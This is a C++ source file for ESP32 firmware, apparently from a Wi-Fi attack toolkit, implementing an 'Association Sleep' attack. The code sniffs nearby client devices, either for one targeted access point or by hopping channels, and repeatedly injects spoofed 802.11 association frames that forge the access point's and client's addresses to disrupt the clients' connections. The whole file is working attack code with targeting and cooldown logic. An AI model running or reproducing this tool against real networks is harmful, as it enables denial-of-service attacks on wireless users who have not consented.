#include "AssociationSleeper.h"
#include "App.h"
#include "Logger.h"
#include <esp_wifi.h>
#include "Config.h"

// --- NEW: Add static instance for the callback ---
AssociationSleeper* AssociationSleeper::instance_ = nullptr;

static uint8_t association_packet[200] = {
    0x00, 0x00, 0x3a, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x04, 0x0a, 0x00, 0x00, 0x00      
};

AssociationSleeper::AssociationSleeper() : 
    app_(nullptr),
    stationSniffer_(nullptr),
    isActive_(false),
    packetCounter_(0),
    lastTargetedPacketTime_(0),
    currentClientIndex_(0),
    state_(State::SNIFFING),
    channelHopIndex_(0),
    lastChannelHopTime_(0)
{
    instance_ = this;
}

void AssociationSleeper::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

bool AssociationSleeper::start(const WifiNetworkInfo& ap) {
    if (isActive_) stop();
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting Targeted Association Sleep attack on %s", ap.ssid);

    attackMode_ = AttackMode::TARGETED;
    targetAp_ = ap;
    isActive_ = true;
    state_ = State::SNIFFING;
    packetCounter_ = 0;
    currentClientIndex_ = 0;

    if (!stationSniffer_->start(targetAp_)) {
        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to start station sniffer.");
        isActive_ = false;
        return false;
    }
    
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

bool AssociationSleeper::start() {
    if (isActive_) stop();
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting Broadcast Association Sleep attack.");

    attackMode_ = AttackMode::BROADCAST;
    isActive_ = true;
    packetCounter_ = 0;
    
    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to acquire RF lock for broadcast.");
        isActive_ = false;
        return false;
    }

    // --- NEW: Setup broadcast sniffing ---
    newClientsFound_.clear();
    recentlyAttacked_.clear();
    channelHopIndex_ = 0;
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    // THE FIX: Use the central channel list
    esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
    lastChannelHopTime_ = millis();

    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

void AssociationSleeper::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Stopping Association Sleep attack.");
    isActive_ = false;
    if (attackMode_ == AttackMode::TARGETED) {
        stationSniffer_->stop();
    }
    rfLock_.reset();
    app_->getHardwareManager().setPerformanceMode(false);
}

void AssociationSleeper::loop() {
    if (!isActive_) return;

    if (attackMode_ == AttackMode::TARGETED) {
        if (state_ == State::SNIFFING) {
            if (stationSniffer_->getFoundStations().size() > 0) {
                LOG(LogLevel::INFO, "ASSOC_SLEEP", "Clients found, starting targeted attack phase.");
                state_ = State::ATTACKING;
            }
        }

        if (state_ == State::ATTACKING) {
            const auto& clients = stationSniffer_->getFoundStations();
            if (clients.empty()) return;

            if (millis() - lastTargetedPacketTime_ > 200) { 
                lastTargetedPacketTime_ = millis();
                if (currentClientIndex_ >= (int)clients.size()) {
                    currentClientIndex_ = 0;
                }
                sendSleepPacket(clients[currentClientIndex_]);
                currentClientIndex_++;
            }
        }
    } else { // BROADCAST MODE LOGIC
        // 1. Channel Hopping
        if (millis() - lastChannelHopTime_ > app_->getConfigManager().getSettings().channelHopDelayMs) {
            lastChannelHopTime_ = millis();
            channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
            esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
        }

        // 2. Process and attack newly found clients
        if (!newClientsFound_.empty()) {
            for (const auto& client : newClientsFound_) {
                char macStr[18];
                sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
                
                // Use the setting from ConfigManager
                if (recentlyAttacked_.find(macStr) == recentlyAttacked_.end() || millis() - recentlyAttacked_[macStr] > app_->getConfigManager().getSettings().attackCooldownMs) {
                    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Broadcast: Attacking new client %s on channel %d", macStr, client.channel);
                    sendSleepPacket(client);
                    recentlyAttacked_[macStr] = millis();
                }
            }
            newClientsFound_.clear();
        }
    }
}

void AssociationSleeper::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void AssociationSleeper::handlePacket(wifi_promiscuous_pkt_t *packet) {
    // This packet handler is ONLY for BROADCAST mode.
    if (attackMode_ != AttackMode::BROADCAST) return;

    const uint8_t *payload = packet->payload;
    const uint16_t frame_control = payload[0] | (payload[1] << 8);
    const bool to_ds = (frame_control >> 8) & 0x01;
    const bool from_ds = (frame_control >> 9) & 0x01;
    const uint8_t *bssid = nullptr;
    const uint8_t *client_mac = nullptr;

    if (!to_ds && from_ds) {
        bssid = payload + 10; client_mac = payload + 4;
    } else if (to_ds && !from_ds) {
        bssid = payload + 4; client_mac = payload + 10;
    } else {
        return;
    }
    
    if (client_mac[0] & 0x01) return;

    StationInfo newStation;
    memcpy(newStation.mac, client_mac, 6);
    
    bool alreadyQueued = false;
    for (const auto& st : newClientsFound_) {
        if (st == newStation) {
            alreadyQueued = true;
            break;
        }
    }

    if (!alreadyQueued) {
        memcpy(newStation.ap_bssid, bssid, 6);
        newStation.channel = packet->rx_ctrl.channel;
        newClientsFound_.push_back(newStation);
    }
}

void AssociationSleeper::sendSleepPacket(const StationInfo& client) {
    esp_wifi_set_channel(client.channel, WIFI_SECOND_CHAN_NONE);
    
    // --- THIS PART IS NOW GENERIC ---
    association_packet[0] = 0x00; association_packet[1] = 0x01;
    memcpy(&association_packet[4], client.ap_bssid, 6);
    memcpy(&association_packet[10], client.mac, 6);
    memcpy(&association_packet[16], client.ap_bssid, 6);
    association_packet[24] = 0x31; association_packet[25] = 0x04;

    // This packet is minimal and doesn't include SSID or RSN, which is often sufficient.
    esp_wifi_80211_tx(WIFI_IF_STA, association_packet, 30, false);
    packetCounter_++;
}

bool AssociationSleeper::isActive() const { return isActive_; }
uint32_t AssociationSleeper::getPacketCount() const { return packetCounter_; }
std::string AssociationSleeper::getTargetSsid() const { return std::string(targetAp_.ssid); }
int AssociationSleeper::getClientCount() const { 
    return (attackMode_ == AttackMode::TARGETED) ? stationSniffer_->getFoundStations().size() : recentlyAttacked_.size();
}
bool AssociationSleeper::isSniffing() const { return state_ == State::SNIFFING; }
AssociationSleeper::AttackMode AssociationSleeper::getAttackMode() const { return attackMode_; }